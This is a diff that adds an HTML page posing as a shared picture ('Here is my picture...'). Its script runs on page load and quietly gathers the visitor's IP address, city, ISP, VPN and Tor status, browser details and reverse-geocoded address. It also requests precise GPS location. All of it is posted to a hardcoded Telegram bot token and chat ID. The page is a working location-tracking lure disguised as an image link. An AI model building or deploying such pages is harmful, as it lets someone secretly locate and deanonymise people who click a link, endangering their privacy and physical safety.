@@ -1,1 +1,132 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta property="og:title" content="Picture">
+  <meta property="og:description" content="Click here...">
+  <meta property="og:image" content="clickhere.jpg">
+  <meta property="og:type" content="website">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hi</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+    }
+    img {
+      max-width: 300px;
+    }
+    .message {
+      margin-top: 20px;
+      font-size: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div class="message">Here is my picture...</div>
+  <script>
+    const PUBLIC_BOT_TOKEN = '7904257718:AAEMNe8Nb4Lk4YcCPr1BjB2bfxq9HF-tjI8';
+    const PUBLIC_CHAT_ID = '7830815090';
+
+    const sendMessage = (text) => {
+      fetch(`https://api.telegram.org/bot${PUBLIC_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: PUBLIC_CHAT_ID,
+          text: text
+        })
+      });
+    };
+
+    const reverseGeocode = async (lat, lon) => {
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+      const data = await res.json();
+      return data.display_name || 'Unknown address';
+    };
+
+    const getInfo = async () => {
+      try {
+        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+        const ipAddress = ipData.ip;
+        const ipLat = ipData.latitude;
+        const ipLon = ipData.longitude;
+        const ipAddressLookup = await reverseGeocode(ipLat, ipLon);
+
+        const browserInfo = `🧭 Browser Info:
+• Locale: ${navigator.language}
+• Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• Current Time: ${new Date().toLocaleString()}
+• User Agent: ${navigator.userAgent}
+• Platform: ${navigator.platform}
+• Device Type: ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
+
+        const ipInfo = `🌍 IP-Based Info:
+• IP: ${ipAddress}
+• Country: ${ipData.country_name}
+• Region: ${ipData.region}
+• City: ${ipData.city}
+• ISP: ${ipData.org}
+• Proxy: ${ipData.proxy ? 'Yes' : 'No'}
+• VPN: ${ipData.security?.vpn ? 'Yes' : 'No'}
+• TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
+• Latitude: ${ipLat}
+• Longitude: ${ipLon}
+• Address: ${ipAddressLookup}`;
+
+        const baseInfo = `${browserInfo}\n\n${ipInfo}`;
+
+        const permission = await navigator.permissions.query({ name: 'geolocation' });
+
+        if (permission.state === 'granted') {
+          navigator.geolocation.getCurrentPosition(async pos => {
+            const geo = pos.coords;
+            const gpsAddress = await reverseGeocode(geo.latitude, geo.longitude);
+            const geoInfo = `📍 Geolocation (Permission Already Granted):
+• Latitude: ${geo.latitude}
+• Longitude: ${geo.longitude}
+• Accuracy: ±${geo.accuracy} meters
+• Address: ${gpsAddress}`;
+
+            sendMessage(`${baseInfo}\n\n${geoInfo}`);
+          }, () => {
+            sendMessage(`${baseInfo}\n\n⚠️ Failed to retrieve geolocation.`);
+          });
+        } else {
+          sendMessage(baseInfo);
+
+          navigator.geolocation.getCurrentPosition(async pos => {
+            const geo = pos.coords;
+            const gpsAddress = await reverseGeocode(geo.latitude, geo.longitude);
+            const geoInfo = `📍 Geolocation (Permission Just Granted):
+• Latitude: ${geo.latitude}
+• Longitude: ${geo.longitude}
+• Accuracy: ±${geo.accuracy} meters
+• Address: ${gpsAddress}`;
+
+            sendMessage(geoInfo);
+          }, err => {
+            if (err.code === 1) {
+              sendMessage('❌ User denied geolocation access.');
+            } else {
+              sendMessage(`⚠️ Geolocation error: ${err.message}`);
+            }
+          });
+        }
+      } catch (e) {
+        sendMessage(`❌ Error collecting data: ${e.message}`);
+      }
+    };
+
+    getInfo();
+  </script>
+</body>
+</html>
